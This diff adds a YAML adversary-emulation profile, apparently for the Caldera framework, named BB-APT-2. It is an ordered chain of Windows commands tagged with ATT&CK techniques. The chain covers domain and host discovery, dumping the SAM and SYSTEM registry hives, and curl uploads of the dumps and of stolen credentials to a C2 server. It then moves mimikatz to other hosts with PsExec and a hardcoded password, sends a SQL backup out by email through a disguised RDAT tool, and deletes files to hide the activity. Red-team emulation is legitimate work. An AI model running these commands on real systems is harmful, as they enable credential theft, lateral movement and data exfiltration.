@@ -1,0 +1,326 @@
+id: 54492b7a-b1f3-4e1f-9f15-47f2220d90c9
+name: BB-APT-2
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 826ab7c7-2aa1-45ef-9319-d8a69618c26b
+- e1654f4a-1e8b-47ac-b615-f4ef7ca24eac
+- e748755f-46c8-482e-8375-5d5b6efe0de8
+- cf7e5083-5592-4d4d-8238-b99c8e9bf0ca
+- 7ec47314-c6f5-4b94-afaa-df6279b96d8c
+- 9ffa96ad-362e-4543-8d08-74498bc9ebac
+- 88a032f5-6af7-4301-a3aa-44b6043eb6aa
+- 566ff767-d508-4694-a176-9fe190e46cea
+- 675991c6-dcf6-40f2-8e60-6e97e3661588
+- ea9a3eaf-48b9-43af-9da0-3f989ed207d3
+- fcede40b-314c-48ac-b979-5018efe8d49f
+- c2fb67cf-c82d-4fa6-9205-e98da9d6c6db
+- 86cd48b2-0ba2-49a2-b1ef-c804cb3c55ac
+- d4f9d74a-fa28-4374-b4f3-e9e3565ca59f
+- 6fcb5d0a-2128-4d28-bd72-dd10adeb2547
+- 7c9ab877-7a92-4e2d-9c95-5136e132d3ba
+- 48a15aaa-8eaf-4f01-9b5f-aa1d01354abc
+- f39eef9c-e906-4e98-b933-5b58615dafbc
+- 65f0e903-80f1-481e-84a9-073b5202245c
+- b9b63a8f-e19c-45f8-a80c-dfe9104e369b
+- 3e713194-437c-40b4-ba43-de895a38a296
+- f3e277cc-a320-4e67-b110-12046e8ad1a5
+- f5acca23-aa5a-476c-975e-abeb87e4322c
+- 9f5bc8b5-7277-4624-9d10-a122f0ab6a86
+- 6d43aeb1-4f7d-4bc5-b4fc-f14bb789ebe5
+- 0d2ae547-d8d8-4e5e-bd81-470f374bdd97
+- a77b0aeb-69ba-40ae-a88f-4c9f4bdc30d5
+- 8ab3e3ad-120c-4491-8546-3948568a2bf1
+- 9f3980d1-1278-4fb9-937c-981d64440d44
+abilities:
+ 826ab7c7-2aa1-45ef-9319-d8a69618c26b:
+  name:  APT-2 whoami 10.1.0.5
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       whoami
+ e1654f4a-1e8b-47ac-b615-f4ef7ca24eac:
+  name:  APT-2 hostname 10.1.0.5
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       hostname
+ e748755f-46c8-482e-8375-5d5b6efe0de8:
+  name:  APT-2 ipconfig/all 10.1.0.5
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       ipconfig /all
+ cf7e5083-5592-4d4d-8238-b99c8e9bf0ca:
+  name:  APT-2 net user /domain 10.1.0.5
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user /domain
+ 7ec47314-c6f5-4b94-afaa-df6279b96d8c:
+  name:  APT-2 net localgroup administrators 10.1.0.5
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Local Groups"
+  technique_id:  T1069.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net localgroup administrators
+ 9ffa96ad-362e-4543-8d08-74498bc9ebac:
+  name:  APT-2 tasklist 10.1.0.5
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       tasklist
+ 88a032f5-6af7-4301-a3aa-44b6043eb6aa:
+  name:  APT-2 sc query 10.1.0.5
+  tactic:  discovery
+  technique_name:  "System Service Discovery"
+  technique_id:  T1007
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       sc query
+ 566ff767-d508-4694-a176-9fe190e46cea:
+  name:  APT-2 AdFind.exe -f objectcategory=computer 10.1.0.5
+  tactic:  discovery
+  technique_name:  "Domain Trust Discovery"
+  technique_id:  T1482
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       AdFind.exe -f objectcategory=computer
+ 675991c6-dcf6-40f2-8e60-6e97e3661588:
+  name:  APT-2 AdFind.exe -f objectcategory=user 10.1.0.5
+  tactic:  discovery
+  technique_name:  "Account Discovery"
+  technique_id:  T1087
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       AdFind.exe -f objectcategory=user
+ ea9a3eaf-48b9-43af-9da0-3f989ed207d3:
+  name:  APT-2 reg save HKLM\SAM 10.1.0.5
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       reg save HKLM\SAM C:\Windows\Temp\SAM
+ fcede40b-314c-48ac-b979-5018efe8d49f:
+  name:  APT-2 reg save HKLM\SYSTEM 10.1.0.5
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
+ c2fb67cf-c82d-4fa6-9205-e98da9d6c6db:
+  name:  APT-2 Compresing SYSTEM 10.1.0.5
+  tactic:  defense-evasion
+  technique_name:  "Compressing SYSTEM prior exfiltration"
+  technique_id:  T1574.007
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "C:\Program Files\WinRAR\rar.exe" a -ma5 C:\Windows\Temp\SYSTEM.rar C:\Windows\Temp\SYSTEM
+ 86cd48b2-0ba2-49a2-b1ef-c804cb3c55ac:
+  name:  APT-2 exfiltration SAM 10.1.0.5
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       curl -F "data=@C:\Windows\Temp\SAM" --header "X-Request-ID: SAM-DUMP" http://192.168.0.4:8888/file/upload
+ d4f9d74a-fa28-4374-b4f3-e9e3565ca59f:
+  name:  APT-2 exfiltration SYSTEM 10.1.0.5
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       curl -F "data=@C:\Windows\Temp\SYSTEM.rar" --header "X-Request-ID: SYSTEM-DUMP" http://192.168.0.4:8888/file/upload
+ 6fcb5d0a-2128-4d28-bd72-dd10adeb2547:
+  name:  APT-2 remove SAM SYSTEM 10.1.0.5
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       del /f C:\Windows\Temp\SAM C:\Windows\Temp\SYSTEM C:\Windows\Temp\SYSTEM.rar
+ 7c9ab877-7a92-4e2d-9c95-5136e132d3ba:
+  name:  APT-2 Copy mimikatz to 10.1.0.5
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy m64.exe C:\Users\Public\Downloads
+ 48a15aaa-8eaf-4f01-9b5f-aa1d01354abc:
+  name:  APT-2 Copy PsExec
+  tactic:  lateral-movement
+  technique_name:  "Copy File"
+  technique_id:  T1003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy PsExec.exe C:\Users\Public\Downloads\
+ f39eef9c-e906-4e98-b933-5b58615dafbc:
+  name:  APT-2 copy mimikatz to 10.1.0.6 via psexec on 10.1.0.5
+  tactic:  lateral-movement
+  technique_name:  "Lateral Tool Transfer"
+  technique_id:  T1570
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy C:\Users\Public\Downloads\m64.exe \\10.1.0.6\C$\Windows\Temp\
+ 65f0e903-80f1-481e-84a9-073b5202245c:
+  name:  APT-2 run mimikatz on 10.1.0.6 via psexec on 10.1.0.5
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping"
+  technique_id:  T1003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       C:\Users\Public\Downloads\PsExec.exe \\10.1.0.6 -u boombox\gosta -p Bl1nk182@g cmd.exe /c "C:\Windows\Temp\m64.exe \"privilege::debug\" \"sekurlsa::logonPasswords\" \"exit\" > C:\Windows\Temp\creds.txt"
+ b9b63a8f-e19c-45f8-a80c-dfe9104e369b:
+  name:  APT-2 copy creds from 10.1.0.6 to 10.1.0.5
+  tactic:  lateral-movement
+  technique_name:  "Lateral Tool Transfer"
+  technique_id:  T1570
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy \\10.1.0.6\C$\Windows\Temp\creds.txt C:\Users\Public\Downloads\creds.txt
+ 3e713194-437c-40b4-ba43-de895a38a296:
+  name:  APT-2 exfiltrating 10.1.0.6 creds from 10.1.0.5
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       curl -F "data=@C:\Users\Public\Downloads\creds.txt" --header "X-Request-ID: CREDS-EXCHANGE" http://192.168.0.4:8888/file/upload
+ f3e277cc-a320-4e67-b110-12046e8ad1a5:
+  name:  APT-2 Defense Evasion: Delete creds on 10.1.0.5
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       del C:\Users\Public\Downloads\creds.txt
+ f5acca23-aa5a-476c-975e-abeb87e4322c:
+  name:  APT-2 copy RDAT.exe to 10.1.0.5
+  tactic:  lateral-movement
+  technique_name:  "Lateral Tool Transfer"
+  technique_id:  T1570
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy RDAT.exe C:\Users\Public\Downloads\Nt.dat
+ 9f5bc8b5-7277-4624-9d10-a122f0ab6a86:
+  name:  APT-2 copy RDAT.exe to 10.1.0.7
+  tactic:  lateral-movement
+  technique_name:  "Lateral Tool Transfer"
+  technique_id:  T1570
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy C:\Users\Public\Downloads\Nt.dat \\10.1.0.7\C$\ProgramData\VMware.exe
+ 6d43aeb1-4f7d-4bc5-b4fc-f14bb789ebe5:
+  name:  APT-2 exfiltration sitedata.bak to external email
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over Alternative Protocol"
+  technique_id:  T1048.003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       C:\Users\Public\Downloads\PsExec.exe \\10.1.0.7 cmd.exe /c
+       "C:\ProgramData\VMware.exe --path=\"C:\Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\Backup\sitedata.bak\" --to=\"tous@boombox.local\" --from=\"gosta@boombox.local\" --server=\"10.1.0.6\" --password='Bl1nk182@g' --chunksize=\"200000\""
+ 0d2ae547-d8d8-4e5e-bd81-470f374bdd97:
+  name:  APT-2 Defense Evasion: Delete Nt.dat from 10.1.0.5
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       del C:\Users\Public\Downloads\Nt.dat
+ a77b0aeb-69ba-40ae-a88f-4c9f4bdc30d5:
+  name:  APT-2 Defense Evasion - Delete VMware at 10.1.0.7
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       C:\Users\Public\Downloads\PsExec.exe \\10.1.0.7 cmd.exe /c "del C:\ProgramData\VMware.exe"
+ 8ab3e3ad-120c-4491-8546-3948568a2bf1:
+  name:  APT-2 Defense Evasion: Delete PsExec on 10.1.0.5
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       del C:\Users\Public\Downloads\PsExec.exe
+ 9f3980d1-1278-4fb9-937c-981d64440d44:
+  name:  APT-2 Defense Evasion: Delete m64.exe on 10.1.0.6
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       del C:\Users\Public\Downloads\m64.exe
